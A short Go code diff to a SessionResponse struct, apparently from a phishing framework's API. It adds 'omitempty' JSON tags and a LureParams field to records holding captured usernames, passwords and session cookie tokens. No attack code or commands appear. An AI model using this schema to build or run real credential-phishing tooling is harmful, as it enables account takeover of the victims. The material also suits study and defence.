@@ -59,19 +59,20 @@ type PaginatedResponse[T any] struct {
 type SessionResponse struct {
 	ID           string                       `json:"id"`
 	Phishlet     string                       `json:"phishlet"`
-	LureID       string                       `json:"lure_id"`
-	RemoteAddr   string                       `json:"remote_addr"`
-	UserAgent    string                       `json:"user_agent"`
-	JA4Hash      string                       `json:"ja4_hash"`
-	BotScore     float64                      `json:"bot_score"`
-	Username     string                       `json:"username"`
-	Password     string                       `json:"password"`
-	Custom       map[string]string            `json:"custom"`
-	CookieTokens map[string]map[string]string `json:"cookie_tokens"` // domain → name → value
-	BodyTokens   map[string]string            `json:"body_tokens"`
-	HTTPTokens   map[string]string            `json:"http_tokens"`
+	LureID       string                       `json:"lure_id,omitempty"`
+	RemoteAddr   string                       `json:"remote_addr,omitempty"`
+	UserAgent    string                       `json:"user_agent,omitempty"`
+	JA4Hash      string                       `json:"ja4_hash,omitempty"`
+	BotScore     float64                      `json:"bot_score,omitempty"`
+	Username     string                       `json:"username,omitempty"`
+	Password     string                       `json:"password,omitempty"`
+	Custom       map[string]string            `json:"custom,omitempty"`
+	LureParams   map[string]string            `json:"lure_params,omitempty"`
+	CookieTokens map[string]map[string]string `json:"cookie_tokens,omitempty"`
+	BodyTokens   map[string]string            `json:"body_tokens,omitempty"`
+	HTTPTokens   map[string]string            `json:"http_tokens,omitempty"`
 	StartedAt    time.Time                    `json:"started_at"`
-	CompletedAt  *time.Time                   `json:"completed_at"`
+	CompletedAt  *time.Time                   `json:"completed_at,omitempty"`
 }
 
 // SessionEvent is delivered by StreamSessions for each lifecycle event.
